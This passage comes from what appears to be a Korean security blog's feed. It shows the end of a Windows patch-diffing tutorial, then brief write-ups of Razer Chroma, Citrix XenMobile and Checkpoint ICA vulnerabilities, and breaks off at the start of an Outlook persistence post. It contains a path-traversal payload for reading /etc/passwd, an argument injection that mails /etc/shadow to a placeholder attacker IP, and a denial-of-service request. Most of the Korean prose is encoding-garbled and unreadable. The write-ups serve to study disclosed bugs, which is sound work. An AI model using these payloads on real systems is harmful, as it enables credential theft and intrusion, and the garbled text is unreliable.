class="hljs-keyword">for</span> patch <span class="hljs-keyword">in</span> args.patches:buf, buf_len = apply_patches(buf, buf_len, patch)alloc_list.append(buf)output_buf = bytes((c_ubyte*buf_len).from_address(buf))<span class="hljs-keyword">with</span> open(args.output, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> w:w.write(output_buf)<span class="hljs-keyword">for</span> alloc <span class="hljs-keyword">in</span> alloc_list:DeltaFree(alloc)hash = hashlib.sha256(output_buf)print(str(len(args.patches)) + <span class="hljs-string">&quot; pathces successfully applied.&quot;</span>)print(<span class="hljs-string">&quot;hash : &quot;</span> + base64.b64encode(hash.digest()).decode())</code></pre><p>ì˜µì…˜ ë³„ ê¸°ëŠ¥ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><p>-i :  reverse ë˜ëŠ” forward differential íŒ¨ì¹˜ í•  ë°”ì´ë„ˆë¦¬ ì§€ì •</p><p>-n : null differential</p><p>-o : íŒ¨ì¹˜ ëœ ê²°ê³¼ íŒŒì¼ ìƒì„±</p><p>-p : íŒ¨ì¹˜ diffíŒŒì¼ ì§€ì •</p></br><pre><code class="hljs powershell">python delta_patch.py <span class="hljs-literal">-i</span> C:\\Windows\\WinSxS\\amd64...<span class="hljs-number">10.0</span>.<span class="hljs-number">18362.1082</span>\\ntoskrnl.exe ^<span class="hljs-literal">-o</span> result_ntoskrnl.exe <span class="hljs-literal">-p</span> C:\\Windows\\WinSxS\\amd64...<span class="hljs-number">10.0</span>.<span class="hljs-number">18362.1082</span>\\r\\ntoskrnl.exe</code></pre><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/3.png"></p><p>1082 ë²„ì „ì˜ <code>ntoskrnl.exe</code>ë¥¼ ê°™ì€ ë²„ì „ì˜ reverse diff íŒŒì¼ë¡œ íŒ¨ì¹˜í•´ ê¸°ë³¸ ë²„ì „ìœ¼ë¡œ ë¡¤ë°±í•œ ê²°ê³¼ì…ë‹ˆë‹¤.</p><p>ì‚¬ì§„ê³¼ ê°™ì´ successfully applied ë©”ì‹œì§€ì™€ hash ê°’ì´ ëœ¨ë©´ íŒ¨ì¹˜ê°€ ì •ìƒì ìœ¼ë¡œ ì´ë£¨ì–´ì§„ ê²ƒì„ í™•ì¸í•  ìˆì–´ìš”.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/4.png"></p><p>ì†ì„±ì—ì„œ í™•ì¸í•´ ë³´ë©´ 10.0.18362.1 ê¸°ë³¸ ë²„ì „ìœ¼ë¡œ ë¡¤ë°±ì´ ì˜ ëë„¤ìš”!</p><p>ì´ì œ ìš°ë¦¬ê°€ ì—…ë°ì´íŠ¸ íŒ¨í‚¤ì§€ì—ì„œ ì¶”ì¶œí•œ <code>ntoskrnl</code>ì˜ 1016ë²„ì „ forward diffë¡œ íŒ¨ì¹˜ë¥¼ í•´ë³´ê² ìŠµë‹ˆë‹¤</p></br><pre><code class="hljs powershell">python delta_patch.py <span class="hljs-literal">-i</span> result_ntoskrnl.exe <span class="hljs-literal">-o</span> ntoskrnl_1016.exe ^<span class="hljs-literal">-p</span> [<span class="hljs-type">EXTRACTED</span> <span class="hljs-type">PATH</span>]\\amd64_microsoft...<span class="hljs-number">10.0</span>.<span class="hljs-number">18362.1016</span>...\\f\\ntoskrnl.exe</code></pre><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/5.png"></p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/6.png"></p><p>ë²„ì „ì€ 1016ìœ¼ë¡œ ì˜ ì˜¬ë¼ê°„ ê²ƒ ê°™êµ°ìš”. hashë„ ë¹„êµí•´ë³´ì£ .</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/7.png"></p><p>JUNKì˜ ntoskrnl manifestì—ì„œ ì°¸ê³ í•œ hashë„ ì¼ì¹˜í•˜ë„¤ìš”! ì´ë¡œì¨ íŒ¨ì¹˜ ìŠ¤í¬ë¦½íŠ¸ë¡œ ì •ìƒì ìœ¼ë¡œ íŒ¨ì¹˜ ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h1 id="Binary-Diffing"><a href="#Binary-Diffing" class="headerlink" title="Binary Diffing"></a>Binary Diffing</h1><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/8.png"></p><p>(ê¸€ì„ ì“°ê³  ìˆëŠ” ì§€ê¸ˆ ë‚´ ìƒíƒœ)</p><p>ë°”ì´ë„ˆë¦¬ íŒ¨ì¹˜ê°€ ì´ë ‡ê²Œ í˜ë“¤ ì¼ì¸ê°€..? ê²©í•˜ê²Œ ì•„ë¬´ê²ƒë„ ì•ˆí•˜ê³  ì‹¶ì–´ì¡Œì§€ë§Œ ê¸°ì™• ì“°ê¸° ì‹œì‘í•œ ê±° ëì€ ë´ì•¼ í•˜ì§€ ì•Šê² ìŠµë‹ˆê¹Œ ìœ¼ì•„ì•… ë¹¨ë¦¬ ëë‚´ê³  ìˆ  ë¨¹ìœ¼ëŸ¬ ê°€ì•¼ì§€</p><p>ë§ˆì§€ë§‰! diffing toolê³¼ ë¶„ì„ ë°©ë²•ì…ë‹ˆë‹¤.</p><p>Diffingì€ IDAì—ì„œ ì§„í–‰í•˜ë©° BinDiffë¼ëŠ” í”ŒëŸ¬ê·¸ì¸ì„ ì‚¬ìš©í•©ë‹ˆë‹¤.  BinDiffëŠ” ë¬´ë£Œë¡œ ë°°í¬ë˜ëŠ” ì½”ë“œ ë¶„ì„ IDA í”ŒëŸ¬ê·¸ì¸ì…ë‹ˆë‹¤. ìœ ëª…í•œ ë§Œí¼ ì„±ëŠ¥ í•˜ë‚˜ëŠ” í™•ì‹¤í•œ ì¹œêµ¬ì£ ?</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/9.png"></p><p>BinDiffëŠ” ì•„ë˜ ë§í¬ì—ì„œ ì„¤ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><a href="https://www.zynamics.com/software.html">zynamics.com - Software</a></p><blockquote><p>IDA 7.2, BinDiff 5(BinExport 10)ì—ì„œ ì§„í–‰í–ˆìŠµë‹ˆë‹¤.</p></blockquote><p>IDAê°€ ì„¤ì¹˜ëœ ê²½ë¡œë¥¼ ì…ë ¥í•˜ê³  ì„¤ì¹˜í•˜ë©´ ë˜ë©° ì •ìƒì ìœ¼ë¡œ ì„¤ì¹˜ê°€ ë˜ì—ˆë‹¤ë©´ IDAì˜ Edit â†’ Pluginsì—ì„œ BinDiffë¥¼ ë³´ì‹¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ìš°ì„  1016, 1082ë¥¼ ê°ê° ì„ ì—´ê³  Editâ†’Pluginsâ†’BinExport10ì„ ì‹¤í–‰í•©ë‹ˆë‹¤.</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/10.png"></p><p>ê·¸ë¦¬ê³  BinExport v2 Binary Exportë¡œ ê°ê° Export í•´ì£¼ë©´ ì¤€ë¹„ëŠ” ë!</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/11.png"></p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/12.png"></p><p>ì´ì œ BinDiffë¥¼ ì‹¤í–‰í•´ì„œ Workspaceë¥¼ ë§Œë“¤ê³  Diffâ†’New Diffì—ì„œ Export í•œ ë‘ ë°”ì´ë„ˆë¦¬ë¥¼ ì„ íƒí•©ë‹ˆë‹¤.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/13.png"></p><p>Exportí•œ íŒŒì¼ì„ ì„ íƒí•˜ê³  Diffí•˜ë©´..!</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/14.png"></p><p>ì´ë ‡ê²Œ Overviewë¥¼ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. SimilarityëŠ” ìœ ì‚¬ë„ë¥¼ ë‚˜íƒ€ë‚´ëŠ”ë°, 1ì— ê°€ê¹Œìš¸ìˆ˜ë¡ ì°¨ì´ê°€ ì—†ë‹¤ëŠ” ëœ»ì…ë‹ˆë‹¤.</p></br><p>ì•„ë˜ë¡œ ë‚´ë ¤ë³´ë©´ Similarityê°€ ë‚®ì€ í•­ëª©ì„ ë³¼ ìˆ˜ ìˆëŠ”ë°, ì´ ì¤‘ í•œ í•­ëª©ì„ ìš°í´ë¦­â†’Open Flow Graphë¥¼ ì‹¤í–‰í•˜ë©´</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/15.png"></p><p>ì´ë ‡ê²Œ ê·¸ë˜í”„ë¡œ ë³´ì—¬ì¤ë‹ˆë‹¤.  ê° ë…¸ë“œ ìƒ‰ë³„ ì˜ë¯¸ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><p>ì´ˆë¡ìƒ‰ - ë³€ê²½ì  ì—†ìŒ</p><p>ë…¸ë€ìƒ‰ - ë³€ê²½ì  ìˆìŒ</p><p>ë¹¨ê°„ìƒ‰  - íŒ¨ì¹˜ì— ì˜í•´ ì œê±°ë¨</p><p>íšŒìƒ‰ - íŒ¨ì¹˜ì— ì˜í•´ ì¶”ê°€ë¨</p><p>ì¢€ ë” ìì„¸íˆ ë³¼ê¹Œìš”? ë³´ë ¤ëŠ” ë…¸ë“œë¥¼ ì„ íƒí•´ë³´ê² ìŠµë‹ˆë‹¤.</p></br><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/16.png"></p><p>ì´ë ‡ê²Œ ì–´ì…ˆë¸”ë¦¬ ì½”ë“œê¹Œì§€ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ° ë°©ì‹ìœ¼ë¡œ ë³€ê²½ì ì„ íŠ¸ë ˆì´ì‹±í•˜ë©´ ì–´ë–¤ ë¶€ë¶„ì´ íŒ¨ì¹˜ë˜ì—ˆëŠ”ì§€ ìì„¸íˆ ë³¼ ìˆ˜ ìˆê² ì£ !</p><h1 id="ë§ˆì¹˜ë©°"><a href="#ë§ˆì¹˜ë©°" class="headerlink" title="ë§ˆì¹˜ë©°.."></a>ë§ˆì¹˜ë©°..</h1><p>íŒ¨ì¹˜ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ë§Œë“¤ì–´ ë’€ìœ¼ë‹ˆ ì›ë°ì´ ë¶„ì„í•  ë•Œ ìœ ìš©í•˜ê²Œ ì“¸ ìˆ˜ ìˆì„ ê²ƒ ê°™ë„¤ìš” ã…ã… ì´ì œ ì·¨ì•½ì .. ì·¨ì•½ì ë§Œ ì°¾ìœ¼ë©´ ë˜ëŠ”ë°â€¦.</p><p><img src="/2020/11/29/l0ch/windows-patch-diffing-part2/17.png"></p><blockquote><p>ì•„ë§ˆ ì•ˆë ê±°ì•¼..</p></blockquote><p>ë‹¤ìŒì—” ë‹¤ë¥¸ ì£¼ì œë¡œ ì°¾ì•„ì˜¤ê² ìŠµë‹ˆë‹¤. ì¡°ê¸ˆë§Œ ë†€êµ¬ìš” ã… (<em>ë§í•  ì½”ë¡œë‚˜ ì–¼ë¥¸ êº¼ì ¸ì¤¬ìœ¼ë©´ ^^!)</em></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://wumb0.in/extracting-and-diffing-ms-patches-in-2020.html">Extracting and Diffing Windows Patches in 2020</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>diffing</tag>
      
      <tag>patch tuesday</tag>
      
      <tag>patch extract</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-16602 : Remote File Execution on Razer Chroma SDK Server</title>
    <link href="/2020/11/28/fabu1ous/2020-11-28/"/>
    <url>/2020/11/28/fabu1ous/2020-11-28/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.angelystor.com/2020/09/cve-2020-16602-remote-file-execution-on.html">CVE-2020-16602</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Razer Chroma SDK Rest server &lt;= 3.12.17</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Razer ChromaëŠ” Razerì‚¬ì˜ ê²Œì´ë°ìš© ì»´í“¨í„° ì£¼ë³€ê¸°ê¸°ë“¤ì˜ RGB íš¨ê³¼ë¥¼ ì œì–´í•˜ëŠ” í”ŒëŸ¬ê·¸ì¸ìœ¼ë¡œ Razer synapse ì„¤ì¹˜ ì‹œ ìë™ìœ¼ë¡œ ì„¤ì¹˜ë©ë‹ˆë‹¤. SDKê°€ ì¡´ì¬í•´ì„œ third partyê°€ Razer Chromaì™€ ì—°ë™ë˜ëŠ” ê¸°ëŠ¥ì„ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p>ì˜ˆ ) Razer ì œí’ˆê³¼ RGBíš¨ê³¼ë¥¼ ë™ê¸°í™”í•˜ëŠ” ì¼€ì´ìŠ¤, ìŒì•…ì— ë§ì¶° Razer ì œí’ˆì˜ RGBë¥¼ ë³€í™”ì‹œí‚¤ëŠ” ìŒì•… ìŠ¤íŠ¸ë¦¬ë° ì„œë¹„ìŠ¤ </p><p>Razer Chroma SDK Rest serverëŠ” Razer Chromaë¥¼ ì‚¬ìš©í•˜ëŠ” ì»´í“¨í„°ì—ì„œ ë™ì‘í•˜ê³  ìˆìœ¼ë©° ëª¨ë“  ë„¤íŠ¸ì›Œí¬ ì¸í„°í˜ì´ìŠ¤ì™€ bind í•´ 54236ë²ˆ í¬íŠ¸ë¡œ listen í•©ë‹ˆë‹¤. <code>http://localhost:54235/razer/chromasdk</code> í˜¹ì€<code> https://chromasdk.io:54236/razer/chromasdk</code> URIë¡œ App infoë¥¼ ë‹´ì€ POST requestë¥¼ ë°›ìœ¼ë©´ ê·¸ App infoì— ë”°ë¼ <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>ì— ì‹¤í–‰íŒŒì¼ì„ ìƒì„±í•˜ê³  ì‹¤í–‰í•©ë‹ˆë‹¤.</p><p>ëª‡ ê°€ì§€ ì´ìŠˆë¡œ ì¸í•´ race-conditionì„ ì´ìš©í•œ arbitrary code executionì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><ol><li><p>í•´ì»¤ëŠ” Razer Chroma SDK Rest serverê°€ ë™ì‘í•˜ëŠ” ì»´í“¨í„°(ì´í•˜ victim)ì˜ IPì£¼ì†Œë§Œ ì•Œë©´ ì›ê²©ìœ¼ë¡œ POST requestë¥¼ ë³´ë‚´ ì„ì˜ì˜ íŒŒì¼ëª…ì„ ê°–ëŠ” ì‹¤í–‰íŒŒì¼ì„ victimì— ìƒì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><code class="hljs text">http://192.123.456.789:54235/razer/chromasdk -&gt; bad requestAddit hosts.txt on Attacker&#x27;s system---192.123.456.789 chromasdk.io---http://chromasdk.io:54235/razer/chromasdk -&gt; http://192.123.456.789:54235/razer/chromasdk</code></pre></li></ol><ol start="2"><li>POST requestë¥¼ ë°›ì•„ <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>ì— ìƒì„±í•œ ì‹¤í–‰íŒŒì¼ì€ Adminê¶Œí•œì´ ìˆëŠ” ìœ ì €ë§Œ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•˜ì§€ë§Œ <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>í´ë”ëŠ” Admin ê¶Œí•œì´ ì—†ì–´ë„ ìˆ˜ì •ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</li></ol><ol start="3"><li>POST requestë¡œ ìƒì„±í•  ì‹¤í–‰íŒŒì¼(test.exe)ê³¼ ë™ì¼í•œ ì´ë¦„ì˜ íŒŒì¼ì´ ì´ë¯¸ <code>C:\ProgramData\Razer Chroma SDK\Apps\</code>í´ë” ì•ˆì— ì¡´ì¬í•˜ë©´ Razer Chroma SDK Rest serverëŠ” ê¸°ì¡´ íŒŒì¼ì˜ ë‚´ìš©ì„ ë®ì–´ì”ë‹ˆë‹¤. í•˜ì§€ë§Œ ê·¸ ì‹¤í–‰íŒŒì¼ì˜ ê¶Œí•œì€ ê·¸ íŒŒì¼ì´ ì‹¤í–‰ë˜ê¸° ì „ê¹Œì§„ ìˆ˜ì •í•˜ì§€ ì•Šìœ¼ë¯€ë¡œ, í•´ì»¤ëŠ” race-conditionìœ¼ë¡œ test.exeì˜ ë‚´ìš©ì„ ìˆ˜ì •í•´  arbitrary code executionì„ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>razer</tag>
      
      <tag>chroma</tag>
      
      <tag>race condition</tag>
      
      <tag>toctou</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-8209 : Path Traversal on Citrix XenMobile Server</title>
    <link href="/2020/11/27/l0ch/2020-11-27/"/>
    <url>/2020/11/27/l0ch/2020-11-27/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/">Path Traversal on Citrix XenMobile Server</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>XenMobile Server 10.12 before RP2<br>XenMobile Server 10.11 before RP4<br>XenMobile Server 10.10 before RP6<br>XenMobile Server before 10.9 RP5</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì¡°ì§ êµ¬ì„±ì›ë“¤ì˜ ëª¨ë°”ì¼ ë””ë°”ì´ìŠ¤ ë° ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ê´€ë¦¬í•˜ëŠ” Endpoint Management ì†”ë£¨ì…˜ì¸ XenMobileì—ì„œ path traversalë¡œ ê¶Œí•œì´ ì—†ëŠ” ì‚¬ìš©ìê°€ íŒ¨ìŠ¤ì›Œë“œë¥¼ í¬í•¨í•œ ì„ì˜ íŒŒì¼ì„ ì½ì„ ìˆ˜ ìˆê³ , ì•”í˜¸í™”ëœ íŒ¨ìŠ¤ì›Œë“œë¥¼ ë³µí˜¸í™” í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p><code>help-sb-download.jsp</code> ì— ì¡´ì¬í•˜ëŠ” ì·¨ì•½í•œ ì½”ë“œëŠ” ì•„ë˜ì™€ ê°™ìŠµë‹ˆë‹¤.</p><pre><code class="hljs jsx">&lt;%    <span class="hljs-built_in">String</span> sbFilePath=<span class="hljs-string">&quot;/opt/sas/support/&quot;</span>;    int length = <span class="hljs-number">0</span>;    <span class="hljs-built_in">String</span> sbFileName=(<span class="hljs-built_in">String</span>)request.getParameter(<span class="hljs-string">&quot;sbFileName&quot;</span>);    ServletOutputStream outStream = response.getOutputStream();    response.setHeader(<span class="hljs-string">&quot;Set-Cookie&quot;</span>,<span class="hljs-string">&quot;fileDownload=true; path=/&quot;</span>);    response.setContentType(<span class="hljs-string">&quot;application/octet-stream&quot;</span>);    response.setHeader(<span class="hljs-string">&quot;Content-Disposition&quot;</span>, <span class="hljs-string">&quot;attachment; filename=\&quot;&quot;</span> + sbFileName + <span class="hljs-string">&#x27;&quot;&#x27;</span>);    File file = <span class="hljs-keyword">new</span> File(sbFilePath+sbFileName);    byte[] byteBuffer = <span class="hljs-keyword">new</span> byte[<span class="hljs-number">4096</span>];    DataInputStream <span class="hljs-keyword">in</span> = <span class="hljs-keyword">new</span> DataInputStream(<span class="hljs-keyword">new</span> FileInputStream(file));    <span class="hljs-keyword">while</span>((<span class="hljs-keyword">in</span> != <span class="hljs-literal">null</span>) &amp;&amp; ((length =<span class="hljs-keyword">in</span>.read(byteBuffer)) != <span class="hljs-number">-1</span>))&#123;outStream.write(byteBuffer,<span class="hljs-number">0</span>,length);    &#125;    <span class="hljs-keyword">in</span>.close();    outStream.flush();%&gt;</code></pre><p>ë§¤ê°œë³€ìˆ˜ë¡œ ë°›ëŠ” <code>sbFileName</code>ì€ <code>sbFilePath</code>ì˜ <code>/op/sas/support/</code> ë’¤ì— ì—°ê²°ë˜ê³  File í´ë˜ìŠ¤ ìƒì„±ìì˜ ì¸ìˆ˜ê°€ ë©ë‹ˆë‹¤. <code>sbFileName</code>ì— <code>../../../etc/passwd</code>ë¥¼ ì „ë‹¬í•˜ë©´ <code>/etc/passwd</code>ì˜ ë‚´ìš©ì„ ì¶œë ¥í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì´ë¥¼ ì´ìš©í•´ ì•”í˜¸í™”ëœ íŒ¨ìŠ¤ì›Œë“œì˜ ë³µí˜¸í™”ë„ ê°€ëŠ¥í•©ë‹ˆë‹¤. íŒ¨ìŠ¤ì›Œë“œ ì•”í˜¸í™”ëŠ” <code>/opt/sas/sw/lib/libsecure.so</code> ì™€ <code>DataSecurity.jar</code> ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ì´ë£¨ì–´ì§€ë©°  <code>/opt/sas/rt/keys/security.properties</code>ì—ëŠ” ì•”í˜¸í™” í‚¤ê°€ ì¡´ì¬í•©ë‹ˆë‹¤. í•´ì»¤ê°€ path traversal ì·¨ì•½ì ì„ ì•…ìš©í•´ ë¼ì´ë¸ŒëŸ¬ë¦¬ì™€ keyë¥¼ ë‹¤ìš´ë¡œë“œí•˜ê³  ë¡œì»¬ í™˜ê²½ì—ì„œ ì•”í˜¸í™” ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ import í•´ íŒ¨ìŠ¤ì›Œë“œë¥¼ ë³µí˜¸í™”í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ì´ ì·¨ì•½ì ì€ <code>help-sb-download.jsp</code> íŒŒì¼ì„ ì œê±°í•˜ëŠ” ê²ƒìœ¼ë¡œ íŒ¨ì¹˜ê°€ ì´ë£¨ì–´ì¡ŒìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>arbitrary file download</tag>
      
      <tag>L0ch</tag>
      
      <tag>path traversal</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-6020: Checkpoint ICA Management Toolì—ì„œ ë°œê²¬ëœ ì·¨ì•½ì  2ê°€ì§€</title>
    <link href="/2020/11/26/idioth/2020-11-26/"/>
    <url>/2020/11/26/idioth/2020-11-26/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://swarm.ptsecurity.com/vulnerabilities-in-checkpoint-ica-management-tool/">Vulnerabilities in Checkpoint ICA Management Tool</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Checkpoint Security Manager - ICA Management Tool</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Checkpoint Security Managementì˜ ICA(Internal Certificate Authority) Management Toolì—ì„œ Argument Injectionê³¼ Denial of Service ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤. ICA Management Toolì€ ê¸°ë³¸ì ìœ¼ë¡œ ë¹„í™œì„±í™”ë˜ì–´ìˆìœ¼ë©° <code>cpca_client set_mgmt_tool on &lt;your certification&gt;</code>ë¡œ í™œì„±í™”í•  ìˆ˜ ìˆìœ¼ë©° ì„¤ì •ì´ í™œì„±í™”ë˜ë©´ http://<smartcenter_ip>:18265/ë¥¼ í†µí•´ ì ‘ê·¼í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. <code>cpca_client set_mgmt_tool on -no_ssl</code>ì„ í†µí•´ í™œì„±í™”í•  ì‹œ ì¸ì¦ ì—†ì´ í•´ë‹¹ ì„œë¹„ìŠ¤ì— ì ‘ê·¼ì´ ê°€ëŠ¥í•˜ë©° Manage Certificatesì— ì ‘ì†í–ˆì„ ë•Œ ê´€ë¦¬ìì¸ì§€ ë³„ë„ì˜ í™•ì¸ì„ ì§„í–‰í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</p><p>ICA Management Toolì—ì„œ ë©”ì¼ì„ ë³´ë‚´ëŠ” í”„ë¡œì„¸ìŠ¤ì¸ cpcaëŠ” sendmail ë°”ì´ë„ˆë¦¬ë¥¼ í†µí•˜ì—¬ ë©”ì¼ì„ ì „ì†¡í•©ë‹ˆë‹¤. sendmailì€ íŒŒì¼ ì „ì†¡ ê¸°ëŠ¥ì„ ì§€ì›í•˜ì§€ë§Œ ë©”ì¼ì„ ë³´ë‚¼ ë•Œ ëˆ„ê°€ ë³´ë‚´ëŠ”ì§€ í™•ì¸ì„ í•˜ì§€ ì•Šìœ¼ë©° ìµœê³  ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰ë˜ë¯€ë¡œ ëª¨ë“  íŒŒì¼ì— ì ‘ê·¼ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì¸ìë¡œ íŒŒì¼ ì´ë¦„ì„ ë„˜ê²¨ì£¼ë©´ í•´ì»¤ì˜ ë©”ì¼ ì„œë²„ë¡œ íŒŒì¼ì„ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p>í•´ì»¤ê°€ netcat ë“±ì„ í†µí•´ ì„œë²„ë¥¼ ì—° í›„ Configure the CAì˜ â€œManagement Tool mail serverâ€ì— <code>&lt;hacker_ip&gt; -m /etc/shadow %0a%0a</code>ë¥¼ ì…ë ¥í•˜ë©´ í•´ì»¤ì˜ ë©”ì¼ ì„œë²„ì— <code>/etc/shadow</code> íŒŒì¼ ë‚´ìš©ì´ ë©”ì¼ í˜•ì‹ìœ¼ë¡œ ë‚ ì•„ì˜¤ê²Œ ë©ë‹ˆë‹¤.</p><p>Denial of Serviceì˜ ê²½ìš° ì…ë ¥ ê°’ì— ëŒ€í•œ ìœ íš¨ì„± ê²€ì‚¬ ì‹¤íŒ¨ë¡œ ì¸í•´ ë°œìƒí•©ë‹ˆë‹¤. ì›ê²© í´ë¼ì´ì–¸íŠ¸ê°€ ë‹¤ìŒê³¼ ê°™ì€ í˜•ì‹ìœ¼ë¡œ POST requestë¥¼ ë³´ë‚¼ ê²½ìš° í”„ë¡œê·¸ë¨ì´ ì¢…ë£Œë©ë‹ˆë‹¤.</p><pre><code class="hljs pgsql">POST /file_init?_ HTTP/<span class="hljs-number">1.1</span>Host: <span class="hljs-keyword">checkpoint</span>.host:<span class="hljs-number">18265</span>Cookie: _Content-Length: <span class="hljs-number">1</span>q</code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>dos</tag>
      
      <tag>argument injection</tag>
      
      <tag>checkpoint</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Outlook Mail based Persistence access</title>
    <link href="/2020/11/25/fabu1ous/2020-11-25/"/>
    <url>/2020/11/25/fabu1ous/2020-11-25/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/">A Fresh Outlook on Mail Based Persistence</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows 10 Outlook</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Outlookì€ Microsoft Officeì˜ ì´ë©”ì¼ í´ë¼ì´ì–¸íŠ¸ë¡œ ì¼ì • ê´€ë¦¬, ì—°ë½ì²˜ ê´€ë¦¬, ì¼ì§€ ë“±ì˜ ë‹¤ì–‘í•œ ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤. ê·¸ì¤‘ ë‹¤ë¥¸ Office ì œí’ˆë“¤ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ Outlookì€ VBA(Visaul Basic for Application) ê¸°ë°˜ ë§¤í¬ë¡œë¥¼ ë§Œë“¤ì–´ ì‚¬ìš©í•˜ëŠ” ê¸°ëŠ¥ì´ ìˆê³ , í•´ì»¤ëŠ” ì´ë¥¼ ì•…ìš©í•´ persistence accessë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>Persistence accessë€ í•´ì»¤ê°€ victimì— initial accessë¥¼ íšë“í•œ ì´í›„ì—ë„ ì§€ì†ì ìœ¼ë¡œ access í•  ìˆ˜ ìˆëŠ” ìƒíƒœì…ë‹ˆë‹¤. íŠ¹ì • ì œëª©ì˜ ì´ë©”ì¼ì´ ë„ì°©í•˜ë©´ íŠ¸ë¦¬ê±° ë˜ëŠ” ì•…ì„± ë§¤í¬ë¡œë¥¼ victimì— ì‹¬ì–´ë†“ìœ¼ë©´ í•´ì»¤ëŠ” ë‹¨ìˆœíˆ ì´ë©”ì¼ì„ ë³´ë‚´ëŠ” ê²ƒë§Œìœ¼ë¡œ ì›ê²© ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><pre><div class="caption"><span>basic</span></div><code class="hljs visual">Option 